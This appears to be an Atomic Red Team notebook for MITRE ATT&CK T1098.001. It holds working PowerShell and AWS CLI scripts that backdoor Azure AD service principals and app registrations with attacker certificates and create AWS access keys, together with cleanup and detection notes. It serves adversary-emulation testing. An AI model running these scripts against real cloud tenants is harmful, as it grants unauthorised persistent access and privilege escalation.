{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "326492a0",
   "metadata": {},
   "source": "# T1098.001 - Additional Cloud Credentials\nAdversaries may add adversary-controlled credentials to a cloud account to maintain persistent access to victim accounts and instances within the environment.\n\nFor example, adversaries may add credentials for Service Principals and Applications in addition to existing legitimate credentials in Azure AD.(Citation: Microsoft SolarWinds Customer Guidance)(Citation: Blue Cloud of Death)(Citation: Blue Cloud of Death Video) These credentials include both x509 keys and passwords.(Citation: Microsoft SolarWinds Customer Guidance) With sufficient permissions, there are a variety of ways to add credentials including the Azure Portal, Azure command line interface, and Azure or Az PowerShell modules.(Citation: Demystifying Azure AD Service Principals)\n\nIn infrastructure-as-a-service (IaaS) environments, after gaining access through [Cloud Accounts](https://attack.mitre.org/techniques/T1078/004), adversaries may generate or import their own SSH keys using either the <code>CreateKeyPair</code> or <code>ImportKeyPair</code> API in AWS or the <code>gcloud compute os-login ssh-keys add</code> command in GCP.(Citation: GCP SSH Key Add) This allows persistent access to instances within the cloud environment without further usage of the compromised cloud accounts.(Citation: Expel IO Evil in AWS)(Citation: Expel Behind the Scenes)\n\nAdversaries may also use the <code>CreateAccessKey</code> API in AWS or the <code>gcloud iam service-accounts keys create</code> command in GCP to add access keys to an account. If the target account has different permissions from the requesting account, the adversary may also be able to escalate their privileges in the environment (i.e. [Cloud Accounts](https://attack.mitre.org/techniques/T1078/004)).(Citation: Rhino Security Labs AWS Privilege Escalation)"
  },
  {
   "cell_type": "markdown",
   "id": "c872d8b0",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "7eeeb9e9",
   "metadata": {},
   "source": "### Atomic Test #1 - Azure AD Application Hijacking - Service Principal\nAdd a certificate to an Application through its Service Principal. The certificate can then be used to authenticate as the application.\nThis can be used for persistence, and also for privilege escalation by benefiting from the Application's rights.\nAn account with high-enough Azure AD privileges is needed, such as Global Administrator or Application Administrator. The account authentication must be without MFA.\n\n**Supported Platforms:** azure-ad\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: AzureAD module must be installed.\n\n##### Check Prereq Commands:\n```powershell\ntry {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nInstall-Module -Name AzureAD -Force\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1da5c461",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1098.001 -TestNumbers 1 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "995e077c",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nImport-Module -Name AzureAD\n$PWord = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $Pword\nConnect-AzureAD -Credential $Credential > $null\n\n$sp = Get-AzureADServicePrincipal -SearchString \"SuperSP\" | Select-Object -First 1\nif ($sp -eq $null) { Write-Warning \"Service Principal not found\"; exit }\n\n# in the context of an ART test (and not a real attack), we don't need to keep access for too long. In case the cleanup command isn't called, it's better to ensure that everything expires after 1 day so it doesn't leave this backdoor open for too long\n$certNotAfter = (Get-Date).AddDays(2)\n$credNotAfter = (Get-Date).AddDays(1)\n$thumb = (New-SelfSignedCertificate -DnsName \"atomicredteam.example.com\" -FriendlyName \"AtomicCert\" -CertStoreLocation \"cert:\\CurrentUser\\My\" -KeyExportPolicy Exportable -Provider \"Microsoft Enhanced RSA and AES Cryptographic Provider\" -NotAfter $certNotAfter).Thumbprint\nWrite-Host \"Generated certificate \"\"$thumb\"\"\"\n$pwd = ConvertTo-SecureString -String \"Passw0rd\" -Force -AsPlainText\nExport-PfxCertificate -cert \"cert:\\CurrentUser\\my\\$thumb\" -FilePath \"$env:TEMP\\SuperSP.pfx\" -Password $pwd > $null\n\n$cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate(\"$env:TEMP\\SuperSP.pfx\", $pwd)\n$keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())\n\nNew-AzureADServicePrincipalKeyCredential -ObjectId $sp.ObjectId -Type AsymmetricX509Cert -CustomKeyIdentifier \"AtomicTest\" -Usage Verify -Value $keyValue -EndDate $credNotAfter\n\nStart-Sleep -s 30\n$tenant = Get-AzureADTenantDetail\n$auth = Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $sp.AppId -CertificateThumbprint $thumb\nWrite-Host \"Application Hijacking worked. Logged in successfully as $($auth.Account.Id) of type $($auth.Account.Type)\"\nWrite-Host \"End of Hijacking\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ffc0e965",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1098.001 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "703be12f",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nImport-Module -Name AzureAD -ErrorAction Ignore\n$PWord = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $Pword\nConnect-AzureAD -Credential $Credential -ErrorAction Ignore > $null\n\n$sp = Get-AzureADServicePrincipal -SearchString \"SuperSP\" | Select-Object -First 1\n$credz = Get-AzureADServicePrincipalKeyCredential -ObjectId $sp.ObjectId\nforeach ($cred in $credz) {\n  if ([System.Text.Encoding]::ASCII.GetString($cred.CustomKeyIdentifier) -eq \"AtomicTest\") {\n    Write-Host \"Removed $($cred.KeyId) key from SP\"\n    Remove-AzureADServicePrincipalKeyCredential -ObjectId $sp.ObjectId -KeyId $cred.KeyId\n  }  \n}\nGet-ChildItem -Path Cert:\\CurrentUser\\My | where { $_.FriendlyName -eq \"AtomicCert\" } | Remove-Item\nrm \"$env:TEMP\\SuperSP.pfx\" -ErrorAction Ignore\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1d2b0e4f",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1098.001 -TestNumbers 1 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "96684fbf",
   "metadata": {},
   "source": "### Atomic Test #2 - Azure AD Application Hijacking - App Registration\nAdd a certificate to an Application through its App Registration. The certificate can then be used to authenticate as the application.\nThis can be used for persistence, and also for privilege escalation by benefiting from the Application's rights.\nAn account with high-enough Azure AD privileges is needed, such as Global Administrator or Application Administrator. The account authentication must be without MFA.\n\n**Supported Platforms:** azure-ad\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: AzureAD module must be installed.\n\n##### Check Prereq Commands:\n```powershell\ntry {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nInstall-Module -Name AzureAD -Force\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "bfdad9ad",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1098.001 -TestNumbers 2 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "853fbf51",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nImport-Module -Name AzureAD\n$PWord = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $Pword\nConnect-AzureAD -Credential $Credential > $null\n\n$app = Get-AzureADApplication -SearchString \"SuperApp\" | Select-Object -First 1\nif ($app -eq $null) { Write-Warning \"Application not found\"; exit }\n\n# in the context of an ART test (and not a real attack), we don't need to keep access for too long. In case the cleanup command isn't called, it's better to ensure that everything expires after 1 day so it doesn't leave this backdoor open for too long\n$certNotAfter = (Get-Date).AddDays(2)\n$credNotAfter = (Get-Date).AddDays(1)\n$thumb = (New-SelfSignedCertificate -DnsName \"atomicredteam.example.com\" -FriendlyName \"AtomicCert\" -CertStoreLocation \"cert:\\CurrentUser\\My\" -KeyExportPolicy Exportable -Provider \"Microsoft Enhanced RSA and AES Cryptographic Provider\" -NotAfter $certNotAfter).Thumbprint\nWrite-Host \"Generated certificate \"\"$thumb\"\"\"\n$pwd = ConvertTo-SecureString -String \"Passw0rd\" -Force -AsPlainText\nExport-PfxCertificate -cert \"cert:\\CurrentUser\\my\\$thumb\" -FilePath \"$env:TEMP\\SuperApp.pfx\" -Password $pwd > $null\n\n$cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate(\"$env:TEMP\\SuperApp.pfx\", $pwd)\n$keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())\n\nNew-AzureADApplicationKeyCredential -ObjectId $app.ObjectId -Type AsymmetricX509Cert -CustomKeyIdentifier \"AtomicTest\" -Usage Verify -Value $keyValue -EndDate $credNotAfter\n\nStart-Sleep -s 30\n$tenant = Get-AzureADTenantDetail\n$auth = Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $app.AppId -CertificateThumbprint $thumb\nWrite-Host \"Application Hijacking worked. Logged in successfully as $($auth.Account.Id) of type $($auth.Account.Type)\"\nWrite-Host \"End of Hijacking\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "05668614",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1098.001 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "8e46c64c",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nImport-Module -Name AzureAD -ErrorAction Ignore\n$PWord = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $Pword\nConnect-AzureAD -Credential $Credential -ErrorAction Ignore > $null\n\n$app = Get-AzureADApplication -SearchString \"SuperApp\" | Select-Object -First 1\n$credz = Get-AzureADApplicationKeyCredential -ObjectId $app.ObjectId\nforeach ($cred in $credz) {\n  if ([System.Text.Encoding]::ASCII.GetString($cred.CustomKeyIdentifier) -eq \"AtomicTest\") {\n    Write-Host \"Removed $($cred.KeyId) key from application\"\n    Remove-AzureADApplicationKeyCredential -ObjectId $app.ObjectId -KeyId $cred.KeyId\n  }  \n}\nGet-ChildItem -Path Cert:\\CurrentUser\\My | where { $_.FriendlyName -eq \"AtomicCert\" } | Remove-Item\nrm \"$env:TEMP\\SuperApp.pfx\" -ErrorAction Ignore\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "65d9d265",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1098.001 -TestNumbers 2 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "d6a21c51",
   "metadata": {},
   "source": "### Atomic Test #3 - AWS - Create Access Key and Secret Key\nAdversaries create their own new access and secret keys to programatically interact with AWS environment, which is already compromised\n\n**Supported Platforms:** iaas:aws\n#### Dependencies:  Run with `sh`!\n##### Description: Check if the user exists.\n\n##### Check Prereq Commands:\n```sh\naws iam list-users | grep atomicredteam\n\n```\n##### Get Prereq Commands:\n```sh\necho Please run atomic test T1136.003, before running this atomic\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6eeab952",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1098.001 -TestNumbers 3 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "7de70612",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `sh`\n",
    "```sh\naws iam create-access-key --user-name atomicredteam > $PathToAtomicsFolder/T1098.001/bin/aws_secret.creds\ncd $PathToAtomicsFolder/T1098.001/bin/\n./aws_secret.sh\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "06f42040",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1098.001 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "23d8a5ed",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\naccess_key=`cat $PathToAtomicsFolder/T1098.001/bin/aws_secret.creds| jq -r '.AccessKey.AccessKeyId'`\naws iam delete-access-key --access-key-id $access_key --user-name atomicredteam\nrm $PathToAtomicsFolder/T1098.001/bin/aws_secret.creds\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "16c4e63e",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1098.001 -TestNumbers 3 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "6aa42a4a",
   "metadata": {},
   "source": "## Detection\nMonitor Azure Activity Logs for Service Principal and Application modifications. Monitor for the usage of APIs that create or import SSH keys, particularly by unexpected users or accounts such as the root account.\n\nMonitor for use of credentials at unusual times or to unusual systems or services. This may also correlate with other suspicious activity."
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "PowerShell",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "PowerShell",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}